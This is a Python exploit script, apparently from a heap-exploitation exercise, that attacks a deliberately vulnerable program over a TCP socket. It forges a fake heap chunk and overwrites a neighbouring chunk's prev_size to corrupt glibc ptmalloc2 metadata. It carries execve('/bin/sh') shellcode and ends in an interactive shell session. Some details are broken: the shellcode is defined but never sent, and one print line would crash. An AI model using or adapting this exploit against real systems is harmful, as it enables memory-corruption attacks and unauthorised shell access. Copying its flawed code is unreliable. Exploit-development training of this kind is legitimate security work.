#!/usr/bin/python

#
# What: Exploit for vuln_3.6.c in ptmalloc2-ubuntu-16.04.4-64bit
# Author: Claes M. Nyberg
# When: Summer 2018
#

import struct
import socket
import sys
import os
import telnetlib
import random
import hashlib
import base64
import binascii

#
# Linux amd64 shellcode 
# execve('/bin/sh', ['/bin/sh', NULL], NULL) 
#
code = "\x48\xba\x2f\x2f\x62\x69"  # movabs $0x68732f6e69622f2f,%rdx
code += "\x6e\x2f\x73\x68"
code += "\x48\xc1\xea\x08"          # shr    $0x8,%rdx
code += "\x52"                      # push   %rdx
code += "\x48\x89\xe7"              # mov    %rsp,%rdi
code += "\x48\x31\xd2"              # xor    %rdx,%rdx
code += "\x52"                      # push   %rdx
code += "\x57"                      # push   %rdi
code += "\x48\x89\xe6"              # mov    %rsp,%rsi
code += "\x6a\x3b"                  # pushq  $0x3b
code += "\x58"                      # pop    %rax
code += "\x0f\x05"                  # syscall 
code += "\x6a\x3c"                  # pushq  $0x3c
code += "\x58"                      # pop    %rax
code += "\x0f\x05"                  # syscall 


def readuntil(s, content, echo = True):
	x = ""
	while True:
		y = s.recv(1)
		if not y:
			sys.stderr.write('[**] Error: FAILED TO READ FROM SOCKET\n')
			if echo:
				sys.stderr.write(x)
			return False
		x += y
		if x.endswith(content):
			if echo:
				sys.stderr.write(x)
			return x
		
def interact(sock):
	t = telnetlib.Telnet()                                                        
	t.sock = sock                                                                    
	t.interact()

def tcpconn(host, port, lport=0):
	target = (host, port)
	sock = socket.socket()
	bound = ''

	if lport != 0:
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		sock.bind(("", int(lport)))
		bound = " (from local port " + str(lport) + ")"

	print("[+] Connecting to " + target[0] + ":" + str(target[1]) + bound)
	try:
		sock.connect(target)
	except socket.error, msg:
		print("[**] Error: Failed to connect: " + str(msg))
		sys.exit(1)	
	return sock


if len(sys.argv) != 3:
	print "Usage: " + sys.argv[0] + " <ip> <port>"
	sys.exit(0)

s = tcpconn(sys.argv[1], int(sys.argv[2]), 0)

#import time
#time.sleep(10)

#-#-#-#-#-#-#-#-#-#-# Fun Stuff Goes Below

# Read address of fake chunk (could be anywhere though)
addr = readuntil(s, "\n", True)
addr = int(addr.split(" ")[-1], 16)
print("[+] Using address %x for fake chunk" %(addr))

# prev_size and size must be equal 
fake_chunk = struct.pack("<Q", 0x100)  # prev_size
fake_chunk += struct.pack("<Q", 0x100) # size
fake_chunk += struct.pack("<Q", addr)  # fwd
fake_chunk += struct.pack("<Q", addr)  # bck
fake_chunk += struct.pack("<Q", addr)  # fwd_nextsize
fake_chunk += struct.pack("<Q", addr)  # bck_nextsize

print("[+] Sending fake chunk, which could be anywhere in memory")
s.send(fake_chunk)

# We need to end the first string with an evil prev_size,
#
#
#
print("[+] Sending string to allocate first chunk");
readuntil(s, "Send me first string\n", True)
fake_prev_size = struct.pack("<Q", (0x602040-addr) & 0xffffffffffffffff);
print("[+] Using an evil fake prev_size of %x" %(int(fake_prev_size)))
str1 = "A" * 0x30 + fake_prev_size # Will result in a malloc size of 0x38 including newline
s.send(str1 + '\n')

print("[+] Sending string to allocate second chunk");
readuntil(s, "Send me second string\n", True)
str2 = "A" * 0xf7 # Will result in a chunk size of 0x100 including newline
s.send(str2 + '\n')

interact(s)
sys.exit(0)
